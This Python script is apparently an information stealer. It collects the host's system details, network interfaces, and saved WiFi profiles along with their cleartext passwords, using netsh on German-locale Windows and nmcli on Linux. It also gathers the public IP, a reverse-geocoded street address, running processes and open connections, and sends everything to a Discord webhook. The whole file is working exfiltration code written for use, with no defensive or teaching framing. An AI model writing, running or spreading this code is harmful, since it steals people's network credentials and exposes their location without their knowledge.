import subprocess
import requests
import json
import platform
import socket
import os
import netifaces
import re

# Discord Webhook URL
webhook_url = 'https://discord.com/api/webhooks/your_webhook_url_here'

# Function to send message to Discord webhook
def send_to_discord(message):
    payload = {'content': message}
    headers = {'Content-Type': 'application/json'}
    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
    if response.status_code == 204:
        print("Message sent successfully to Discord webhook.")
    else:
        print(f"Failed to send message to Discord webhook. Status code: {response.status_code}")
        print(f"Response: {response.text}")

# Function to execute command and capture output
def execute_command(command):
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    return result.stdout.strip()

# Function to get device information
def get_device_info():
    device_info = {
        'Hostname': socket.gethostname(),
        'Platform': platform.system(),
        'Platform Release': platform.release(),
        'Platform Version': platform.version(),
        'Architecture': platform.machine(),
        'Processor': platform.processor(),
        'Python Version': platform.python_version(),
    }
    return device_info

# Function to get network interfaces and their details
def get_network_interfaces():
    interfaces = netifaces.interfaces()
    network_info = {}

    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        info = {}
        if netifaces.AF_INET in addrs:
            info['IPv4'] = addrs[netifaces.AF_INET]
        if netifaces.AF_INET6 in addrs:
            info['IPv6'] = addrs[netifaces.AF_INET6]
        network_info[iface] = info
    
    return network_info

# Function to get saved WiFi profiles for Windows
def get_saved_wifi_profiles_windows():
    wifi_profiles = []
    profiles = execute_command('netsh wlan show profiles')
    profiles = profiles.split('\n')
    profiles = [profile.split(':')[1].strip() for profile in profiles if 'Profil für' in profile]

    for profile in profiles:
        profile_info = {}
        profile_info['SSID'] = profile
        profile_details = execute_command(f'netsh wlan show profile name="{profile}" key=clear')
        if 'Sicherheitsschlüssel' in profile_details:
            security_key = profile_details.split('Sicherheitsschlüssel')[-1].strip().split('\n')[0].split(':')[1].strip()
            profile_info['Security Key'] = security_key
        # Get IP addresses for each profile
        ip_addresses = execute_command(f'netsh wlan show profile name="{profile}"')
        ip_pattern = re.compile(r'IP-Adresse.*?:\s*(.*)', re.IGNORECASE)
        match = ip_pattern.search(ip_addresses)
        if match:
            profile_info['IP Address'] = match.group(1).strip()
        else:
            profile_info['IP Address'] = 'Not available'
            
        wifi_profiles.append(profile_info)

    return wifi_profiles

# Function to get saved WiFi profiles for Linux (NetworkManager)
def get_saved_wifi_profiles_linux():
    wifi_profiles = []
    profiles = execute_command('nmcli connection show --active')
    profiles = profiles.split('\n')
    profiles = [profile.split()[0] for profile in profiles if 'WLAN' in profile]

    for profile in profiles:
        profile_info = {}
        profile_info['SSID'] = profile
        profile_details = execute_command(f'nmcli connection show {profile}')
        if '802-11-wireless-security.psk' in profile_details:
            security_key = profile_details.split('802-11-wireless-security.psk:')[1].strip().split('\n')[0].strip()
            profile_info['Security Key'] = security_key
        # Get IP addresses for each profile (currently set to None)
        profile_info['IP Address'] = None  # Replace with actual logic to fetch IP addresses
        wifi_profiles.append(profile_info)

    return wifi_profiles

# Function to collect all saved WiFi profiles based on platform
def get_saved_wifi_profiles():
    if platform.system() == 'Windows':
        return get_saved_wifi_profiles_windows()
    elif platform.system() == 'Linux':
        return get_saved_wifi_profiles_linux()
    else:
        return []

# Function to get public IP address
def get_public_ip():
    ip = execute_command('curl -s https://api64.ipify.org')
    return ip

# Function to get location information based on public IP
def get_location_info(public_ip):
    response = requests.get(f'https://ipinfo.io/{public_ip}/json')
    if response.status_code == 200:
        location_info = response.json()
    else:
        location_info = {'error': 'Could not retrieve location information'}

    return location_info

# Function to get physical address from location coordinates
def get_address(location):
    if 'loc' in location:
        lat, lon = location['loc'].split(',')
        response = requests.get(f'https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}')
        if response.status_code == 200:
            address_info = response.json()
            address = address_info.get('display_name', 'Address not found')
        else:
            address = 'Could not retrieve address information'
    else:
        address = 'Location coordinates not available'
    
    return address

# Function to get storage information
def get_storage_info():
    storage_info = execute_command('df -h')
    return storage_info

# Function to get memory information
def get_memory_info():
    memory_info = execute_command('free -h')
    return memory_info

# Function to get CPU information
def get_cpu_info():
    cpu_info = execute_command('lscpu')
    return cpu_info

# Function to get running processes
def get_running_processes():
    processes = execute_command('ps aux')
    return processes

# Function to get network connections
def get_network_connections():
    connections = execute_command('netstat -tuln')
    return connections

# Collect detailed network, WiFi, and device information
network_interfaces = get_network_interfaces()
saved_wifi_profiles = get_saved_wifi_profiles()
public_ip = get_public_ip()
location_info = get_location_info(public_ip)
address = get_address(location_info)
device_info = get_device_info()
storage_info = get_storage_info()
memory_info = get_memory_info()
cpu_info = get_cpu_info()
running_processes = get_running_processes()
network_connections = get_network_connections()

# Format information for Discord message
message = (
    f"**Device Information**\n"
    f"Hostname: {device_info['Hostname']}\n"
    f"Platform: {device_info['Platform']} {device_info['Platform Release']} ({device_info['Architecture']})\n"
    f"Processor: {device_info['Processor']}\n"
    f"Python Version: {device_info['Python Version']}\n\n"
    
    f"**Network Interfaces**\n"
)
for iface, info in network_interfaces.items():
    message += f"Interface: {iface}\n"
    if 'IPv4' in info:
        for addr in info['IPv4']:
            message += f"IPv4 Address: {addr['addr']} ({addr['netmask']})\n"
    if 'IPv6' in info:
        for addr in info['IPv6']:
            message += f"IPv6 Address: {addr['addr']} ({addr.get('netmask', 'N/A')})\n"
    message += "\n"

message += "**Saved WiFi Profiles**\n"
for profile in saved_wifi_profiles:
    message += f"SSID: {profile['SSID']}\n"
    if 'Security Key' in profile:
        message += f"Security Key: {profile['Security Key']}\n"
    if 'IP Address' in profile:
        message += f"IP Address: {profile['IP Address']}\n"
    message += "\n"

message += (
    f"**Public IP and Location**\n"
    f"Public IP Address: {public_ip}\n"
)
if 'error' in location_info:
    message += f"Location Information: {location_info['error']}\n"
else:
    message += f"Location: {location_info.get('city', 'Unknown')}, {location_info.get('region', 'Unknown')}, {location_info.get('country', 'Unknown')}\n"
message += f"Address: {address}\n\n"

message += (
    f"**Storage Information**\n"
    f"{storage_info}\n\n"
    
    f"**Memory Information**\n"
    f"{memory_info}\n\n"
    
    f"**CPU Information**\n"
    f"{cpu_info}\n\n"
    
    f"**Running Processes**\n"
    f"{running_processes}\n\n"
    
    f"**Network Connections**\n"
    f"{network_connections}\n"
)

# Send message to Discord webhook
send_to_discord(message)
